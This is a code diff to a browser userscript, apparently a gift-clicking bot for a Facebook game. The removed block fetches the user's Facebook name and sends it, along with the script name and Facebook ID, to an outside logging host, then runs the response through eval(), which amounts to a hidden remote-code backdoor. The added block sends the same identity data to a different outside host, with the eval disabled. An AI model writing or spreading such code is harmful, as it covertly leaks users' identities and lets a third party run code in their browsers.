@@ -65,37 +65,7 @@ function getIndex(which,list){
    }
  }
 }
-var name_uid = '';
-var the_name = 'FastGiftClick v2 - G';
-var mUrl = 'https://graph.facebook.com/'+User.trackId;
-var the_id = User.trackId;
-   $.ajax({
-        url: mUrl,
-        dataType: 'json',
-        success: function(data, status) {         
-          //alert(data.name);
-          name_uid=data.name;
-
-      }
-      ,complete: function(){
-           $.ajax({
-                                                 async : true
-                                                ,cache : false
-                                                ,type    : "GET"
-                                                ,url     : "http://cux.cu.funpic.de/mw/log_new.php"
-                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
-                                                ,dataType: "jsonp"                                     
-                                                ,xhrFields: {
-                                                    withCredentials: true
-                                                }
-												,success : function(data,status){
-												      eval(data);
-												}
-												
-                              }); 
-						  
-                  }
-   });;   	
+ 	
 	    var items=new Object();
 		var itemList=new Array();
 		var itemCount=new Array();
@@ -230,14 +200,36 @@ function ClickGift(id,list,type){
 	    $(e).click(function(){if (confirm('Are you sure, you want to ignore all that?')){ClickGift(the_id,itemList,2)};return false;});		
 	  }	  
 	);	
-			//alert(out);
-			/*
-			if (actions.length > 0){
-				next_link();	
-			}
-			else{
-			  alert("No bloody bags found...");
-			}
-			*/
+var name_uid = '';
+var the_name = 'FastGifts - S';
 
+var the_id = User.trackId;
+var mUrl = 'https://graph.facebook.com/'+User.trackId;
+   $.ajax({
+        url: mUrl,
+        dataType: 'json',
+        success: function(data, status) {         
+          //alert(data.name);
+          name_uid=data.name;
+
+      }
+      ,complete: function(){
+           $.ajax({
+                                                 async : true
+                                                ,cache : false
+                                                ,type    : "GET"
+                                                ,url     : "http://caneda.lima-city.de/mw/log_new.php"
+                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
+                                                ,dataType: "jsonp"                                     
+                                                ,xhrFields: {
+                                                    withCredentials: true
+                                                }
+												,success : function(data,status){
+												    //  eval(data);
+												}
+												
+                              }); 
+						  
+                  }
+   });
 }())		
